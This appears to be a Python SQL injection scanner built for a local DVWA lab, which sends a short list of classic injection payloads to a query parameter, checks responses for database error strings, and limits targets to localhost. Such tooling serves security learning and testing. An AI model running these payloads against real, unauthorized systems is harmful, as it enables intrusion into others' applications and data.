"""
SQL Injection Scanner

WARNING:
- Scan ONLY authorized targets such as:
  - http://localhost
  - http://127.0.0.1
  - DVWA (Damn Vulnerable Web Application)
- Unauthorized scanning is illegal.
"""

import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse


TARGET_URL = "http://localhost/dvwa/vulnerabilities/sqli/"
PARAMETERS = ["id"]        # parameters to test
MAX_THREADS = 5            # concurrency limit
RATE_LIMIT = 0.5           # seconds between requests
LOG_FILE = "scan_log.txt"
TIMEOUT = 5


SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'--",
    "';--",
    "') OR ('1'='1"
]

ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pdoexception",
    "mysql_fetch",
    "sqlstate"
]


def is_authorized_target(url):
    parsed = urlparse(url)
    allowed_hosts = ["localhost", "127.0.0.1"]
    return parsed.hostname in allowed_hosts

log_lock = threading.Lock()

def log(message):
    with log_lock:
        with open(LOG_FILE, "a") as f:
            f.write(message + "\n")

def test_parameter(url, param):
    """
    Tests a single parameter for SQL injection
    """
    findings = []

    for payload in SQL_PAYLOADS:
        params = {param: payload}

        try:
            response = requests.get(
                url,
                params=params,
                timeout=TIMEOUT
            )

            body = response.text.lower()

            for error in ERROR_PATTERNS:
                if error in body:
                    findings.append({
                        "parameter": param,
                        "payload": payload,
                        "error": error
                    })

                    log(
                        f"[{datetime.now()}] VULNERABLE | param={param} | payload={payload}"
                    )
                    return findings

        except requests.RequestException:
            pass

        time.sleep(RATE_LIMIT)

    return findings

def scan_target(url, params):
    print("Starting scan on authorized target")
    results = []

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [
            executor.submit(test_parameter, url, param)
            for param in params
        ]

        for future in futures:
            result = future.result()
            if result:
                results.extend(result)

    return results

if __name__ == "__main__":

    if not is_authorized_target(TARGET_URL):
        print("[!] Unauthorized target detected")
        print("[!] Scan aborted for legal reasons")
        exit(1)

    findings = scan_target(TARGET_URL, PARAMETERS)

    if findings:
        print("\n[!] SQL Injection Vulnerabilities Found:\n")
        for f in findings:
            print(f"Parameter : {f['parameter']}")
            print(f"Payload   : {f['payload']}")
            print(f"Indicator : {f['error']}")
            print("-" * 40)
    else:
        print("\nNo SQL Injection vulnerabilities detected")

    print("\nScan completed. Results logged in scan_log.txt")